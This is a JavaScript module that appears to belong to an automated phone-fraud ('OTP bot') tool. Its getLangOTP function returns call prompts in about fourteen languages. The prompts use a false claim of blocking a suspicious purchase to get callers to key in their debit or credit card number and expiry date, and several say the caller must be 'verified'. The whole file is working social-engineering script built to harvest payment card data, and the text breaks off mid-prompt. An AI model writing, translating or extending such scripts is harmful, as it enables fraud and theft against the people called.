...
exports.getLangOTP = void 0;
const getLangOTP = ({ language, step, dtmf, sp, cardType, }) => {
    switch (step) {
        case `shared`:
            switch (sp) {
                case `1`:
            ...
            switch (sp) {
                ...
                case `2`:
                    return {
                        ...
                        'es-ES': `Bien, ingresó ${dtmf}. Necesitamos verificarlo, ingrese su número de tarjeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido de la tecla numeral.`,
                        'pt-PT': `Ok, você digitou ${dtmf}. Precisamos verificá-lo, por favor, digite o número do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido da chave sustenido.`,
                        'pt-BR': `Ok, você digitou ${dtmf}. Precisamos verificá-lo, por favor, digite o número do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido da chave sustenido.`,
                        'it-IT': `Ok, hai inserito ${dtmf}. Dobbiamo verificarti, inserisci il numero della tua carta di ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBITO`
                            : `CREDITO`} seguito dal cancelletto.`,
                        'fr-FR': `D'accord, vous avez entré ${dtmf}. Nous devons vous vérifier, veuillez entrer votre numéro de carte ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `CRÉDIT`} suivi de la touche dièse.`,
                        'de-DE': `Okay, Sie haben ${dtmf} eingegeben. Wir müssen Sie verifizieren, bitte geben Sie Ihre ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}Kartennummer gefolgt von der Raute-Taste ein.`,
                        'nb-NO': `Ok, du har skrevet inn ${dtmf}. Vi må bekrefte deg, vennligst skriv inn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debet`
                            : `kreditt`}kortnummeret etterfulgt av pund-tasten.`,
                        'pl-PL': `OK, wpisałeś ${dtmf}. Musimy Cię zweryfikować, wprowadź numer karty ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `KREDYT`}, a następnie krzyżyk.`,
                        'sv-SE': `Okej, du har angett ${dtmf}. Vi måste verifiera dig, vänligen ange ditt ${cardType && cardType.toLowerCase() === `debit`
                            ? `betal`
                            : `KREDIT`}kortsnummer följt av pundnyckeln.`,
                        'tr-TR': `Tamam, ${dtmf} girdiniz. Sizi doğrulamamız gerekiyor, lütfen ${cardType && cardType.toLowerCase() === `debit` ? `BANKA` : `KREDİ`} kartı numaranızı ve ardından kare anahtarını girin.`,
                        'cy-GB': `Iawn, rydych chi wedi nodi ${dtmf}. Mae angen i ni ddilysu chi, rhowch rif eich cerdyn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debyd`
                            : `CREDYD`} ac yna'r allwedd punt.`,
                        'nl-NL': `Oké, je hebt ${dtmf} ingevoerd. We moeten je verifiëren. Voer je ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `CREDIT-`}kaartnummer in gevolgd door het hekje.`,
                        'da-DK': `Okay, du har indtastet ${dtmf}. Vi skal bekræfte dig. Indtast venligst dit ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}kortnummer efterfulgt af pund-tasten.`,
                        'ca-ES': `D'acord, heu introduït ${dtmf}. Hem de verificar-vos, si us plau, introduïu el número de la vostra targeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÈBIT`
            ...
            switch (sp) {
                case `1`:
                    return {
                        ...
                        'es-ES': `No has ingresado nada. Por su SEGURIDAD y para BLOQUEAR esta compra, ingrese su número de tarjeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido de la tecla numeral.`,
                        'pt-PT': `Você não digitou nada. Para sua SEGURANÇA e para BLOQUEAR esta compra, digite o número do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido da chave sustenido.`,
                        'pt-BR': `Você não digitou nada. Para sua SEGURANÇA e para BLOQUEAR esta compra, digite o número do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido da chave sustenido.`,
                        'it-IT': `Non hai inserito nulla. Per la tua SICUREZZA e per BLOCCARE questo acquisto, inserisci il numero della tua carta di ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBITO`
                            : `CREDITO`} seguito dal cancelletto.`,
                        'fr-FR': `Vous n'avez rien saisi. Pour votre SÉCURITÉ et pour BLOQUER cet achat, veuillez entrer votre numéro de carte ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `CRÉDIT`} suivi de la touche dièse.`,
                        'de-DE': `Sie haben nichts eingegeben. Bitte geben Sie zu Ihrer SICHERHEIT und um diesen Kauf zu BLOCKIEREN Ihre ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}Kartennummer gefolgt von der Raute-Taste ein.`,
                        'nb-NO': `Du har ikke skrevet inn noe. For din SIKKERHET og for å BLOKKERE dette kjøpet, skriv inn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debet`
                            : `kreditt`}kortnummeret etterfulgt av pund-tasten.`,
                        'pl-PL': `Nic nie wpisałeś. Aby uzyskać BEZPIECZEŃSTWO i ZABLOKOWAĆ ten zakup, wprowadź numer karty ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `KREDYT`}, a następnie krzyżyk.`,
                        'sv-SE': `Du har inte angett något. För din SÄKERHET och för att BLOCKERA detta köp, vänligen ange ditt ${cardType && cardType.toLowerCase() === `debit`
                            ? `betal`
                            : `KREDIT`}kortsnummer följt av pundnyckeln.`,
                        'tr-TR': `Hiçbir şey girmediniz. GÜVENLİĞİNİZ için ve bu satın alma işlemini ENGELLEMEK için lütfen ${cardType && cardType.toLowerCase() === `debit` ? `BANKA` : `KREDİ`} kartı numaranızı ve ardından kare anahtarını girin.`,
                        'cy-GB': `Nid ydych wedi nodi unrhyw beth. Ar gyfer eich DIOGELWCH ac i flocio'r pryniant hwn, rhowch rif eich cerdyn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debyd`
                            : `CREDYD`} ac yna'r allwedd punt.`,
                        'nl-NL': `U heeft niets ingevuld. Voor uw VEILIGHEID en om deze aankoop te BLOKKEREN, voert u uw ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `CREDIT-`}kaartnummer in, gevolgd door het hekje.`,
                        'da-DK': `Du har ikke indtastet noget. For din SIKKERHED og for at BLOKERE dette køb skal du indtaste dit ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}kortnummer efterfulgt af pund-tasten.`,
                        'ca-ES': `No has introduït res. Per a la vostra SEGURETAT i per BLOQUEAR aquesta compra, introduïu el número de la vostra targeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÈBIT`
                            : `CRÈDIT`} seguit de la clau de lliura.`,
                    }[language];
                case `2`:
                    return {
                        ...
                        'es-ES': `El número de tarjeta que ha introducido es incorrecto. Por su SEGURIDAD y para BLOQUEAR esta compra, ingrese su número de tarjeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido de la tecla numeral.`,
                        'pt-PT': `O número do cartão que você digitou está incorreto. Para sua SEGURANÇA e para BLOQUEAR esta compra, digite o número do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido da chave sustenido.`,
                        'pt-BR': `O número do cartão que você digitou está incorreto. Para sua SEGURANÇA e para BLOQUEAR esta compra, digite o número do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido da chave sustenido.`,
                        'it-IT': `Il numero della carta che hai inserito non è corretto. Per la tua SICUREZZA e per BLOCCARE questo acquisto, inserisci il numero della tua carta di ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBITO`
                            : `CREDITO`} seguito dal cancelletto.`,
                        'fr-FR': `Le numéro de carte que vous avez entré est incorrect. Pour votre SÉCURITÉ et pour BLOQUER cet achat, veuillez entrer votre numéro de carte ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `CRÉDIT`} suivi de la touche dièse.`,
                        'de-DE': `Die eingegebene Kartennummer ist falsch. Bitte geben Sie zu Ihrer SICHERHEIT und um diesen Kauf zu BLOCKIEREN Ihre ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}Kartennummer gefolgt von der Raute-Taste ein.`,
                        'nb-NO': `Kortnummeret du har oppgitt er feil. For din SIKKERHET og for å BLOKKERE dette kjøpet, skriv inn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debet`
                            : `kreditt`}kortnummeret etterfulgt av pund-tasten.`,
                        'pl-PL': `Wprowadzony numer karty jest nieprawidłowy. Aby uzyskać BEZPIECZEŃSTWO i ZABLOKOWAĆ ten zakup, wprowadź numer karty ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `KREDYT`}, a następnie krzyżyk.`,
                        'sv-SE': `Kortnumret du har angett är felaktigt. För din SÄKERHET och för att BLOCKERA detta köp, vänligen ange ditt ${cardType && cardType.toLowerCase() === `debit`
                            ? `betal`
                            : `KREDIT`}kortsnummer följt av pundnyckeln.`,
                        'tr-TR': `Girdiğiniz kart numarası yanlış. GÜVENLİĞİNİZ için ve bu satın alma işlemini ENGELLEMEK için lütfen ${cardType && cardType.toLowerCase() === `debit` ? `BANKA` : `KREDİ`} kartı numaranızı ve ardından kare anahtarını girin.`,
                        'cy-GB': `Mae rhif y cerdyn rydych chi wedi'i nodi yn anghywir. Ar gyfer eich DIOGELWCH ac i flocio'r pryniant hwn, rhowch rif eich cerdyn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debyd`
                            : `CREDYD`} ac yna'r allwedd punt.`,
                        'nl-NL': `Het door u ingevoerde kaartnummer is onjuist. Voor uw VEILIGHEID en om deze aankoop te BLOKKEREN, voert u uw ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `CREDIT-`}kaartnummer in, gevolgd door het hekje.`,
                        'da-DK': `Kortnummeret du har indtastet er forkert. For din SIKKERHED og for at BLOKERE dette køb skal du indtaste dit ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}kortnummer efterfulgt af pund-tasten.`,
                        'ca-ES': `El número de targeta que heu introduït és incorrecte. Per a la vostra SEGURETAT i per BLOQUEAR aquesta compra, introduïu el número de la vostra targeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÈBIT`
                            : `CRÈDIT`} seguit de la clau de lliura.`,
                    }[language];
                case `3`:
                    return {
                        ...
                        'es-ES': `EXCELENTE, ingresó ${dtmf}. Ingrese la fecha de vencimiento de su tarjeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguida de la tecla numeral.`,
                        'pt-PT': `ÓTIMO, você digitou ${dtmf}. Por favor, digite a data de validade do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguida da chave sustenido.`,
                        'pt-BR': `ÓTIMO, você digitou ${dtmf}. Por favor, digite a data de validade do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguida da chave sustenido.`,
                        'it-IT': `GRANDE, hai inserito ${dtmf}. Inserisci la data di scadenza della tua carta di ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBITO`
                            : `CREDITO`} seguita dal cancelletto.`,
                        'fr-FR': `SUPER, vous avez entré ${dtmf}. Veuillez entrer la date d'expiration de votre carte ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `CRÉDIT`} suivie de la touche dièse.`,
                        'de-DE': `GROSSARTIG, Sie haben ${dtmf} eingegeben. Bitte geben Sie das Ablaufdatum Ihrer ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}Karte gefolgt von der Raute-Taste ein.`,
                        'nb-NO': `FLOTT, du har skrevet inn ${dtmf}. Vennligst skriv inn utløpsdatoen for ${cardType && cardType.toLowerCase() === `debit`
                            ? `debet`
                            : `kreditt`}kortet ditt etterfulgt av pundnøkkelen.`,
                        'pl-PL': `ŚWIETNIE, wpisałeś ${dtmf}. Wprowadź datę ważności karty ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `KREDYT`}, a następnie krzyżyk.`,
                        'sv-SE': `BRA, du har angett ${dtmf}. Ange ditt ${cardType && cardType.toLowerCase() === `debit`
                            ? `betal`
                            : `KREDIT`}korts utgångsdatum följt av pundnyckeln.`,
                        'tr-TR': `BÜYÜK, ${dtmf} girdiniz. Lütfen ${cardType && cardType.toLowerCase() === `debit` ? `BANKA` : `KREDİ`} kartınızın son kullanma tarihini ve ardından kare anahtarını girin.`,
                        'cy-GB': `GWYCH, rydych wedi nodi ${dtmf}. Nodwch ddyddiad dod i ben eich cerdyn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debyd`
                            : `CREDYD`} ac yna'r allwedd punt.`,
                        'nl-NL': `GEWELDIG, u heeft ${dtmf} ingevoerd. Voer de vervaldatum van uw ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `CREDIT-`}kaart in, gevolgd door het hekje.`,
                        'da-DK': `FANTASTISK, du har indtastet ${dtmf}. Indtast venligst dit ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}korts udløbsdato efterfulgt af pund-tasten.`,
                        'ca-ES': `GENIAL, heu introduït ${dtmf}. Introduïu la data de caducitat de la vostra targeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÈBIT`
